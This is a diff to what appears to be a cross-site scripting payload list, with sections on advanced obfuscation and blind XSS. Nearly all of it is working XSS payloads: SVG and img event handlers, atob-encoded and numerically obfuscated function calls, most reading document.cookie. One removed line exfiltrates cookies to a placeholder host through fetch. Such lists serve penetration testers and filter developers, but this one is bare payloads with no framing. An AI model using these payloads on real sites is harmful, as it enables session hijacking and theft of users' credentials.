@@ -92,7 +92,6 @@ onpaste=alert(document.cookie)
 <!-- ==================== SECTION 14: ADVANCED OBFUSCATION ==================== -->
 <svg/onload=top[8680439..toString(30)](document.cookie)>
 <svg/onload=self[`${atob`YWxlcnQ`}`]`${document.cookie}`>
-<svg/onload=window[``]() alert(document.cookie)
 <svg/onload=parent[`al${`ert`}`](document.cookie)
 
 <!-- ==================== SECTION 15: BLIND XSS ==================== -->
@@ -131,8 +130,6 @@ onpaste=alert(document.cookie)
 
 <svg/onload=alert`${document.cookie}`>
 <iframe srcdoc='<svg onload=alert(document.cookie)>'>
-<img src=x:alert(alt) onerror=eval(src) alt=document.cookie>
-<javascript:fetch`//${document.cookie}.your-server.com`>
 <svg><script>alert(1)</script>
 "><img src=x id=dm onerror=eval(id)>
 <body onload="#".substr(alert(document.cookie))>
@@ -152,9 +149,7 @@ onpaste=alert(document.cookie)
 "><svg/onload=top[8680439..toString(30)](1)>
 "><svg/onload=top[atob`YWxlcnQ`]`${document.cookie}`>
 "><svg/onload=self[`${atob`YWxlcnQ`}`]`1`>
-<svg/onload=function::`alert\x281\x29`()>
-<svg/onload=window[``]() alert(1)
-"><svg/onload=top[8680439..toString(30)]`1`>
+<svg/onload=top[8680439..toString(30)]`1`>
 <svg><script>&#97&#108&#101&#114&#116(1)</script>
 "><svg><script>self[`${atob`YWxlcnQ`}`]`${document.cookie}`</script>
 <img src=x onerror=this.src='javascript:alert(1)'>
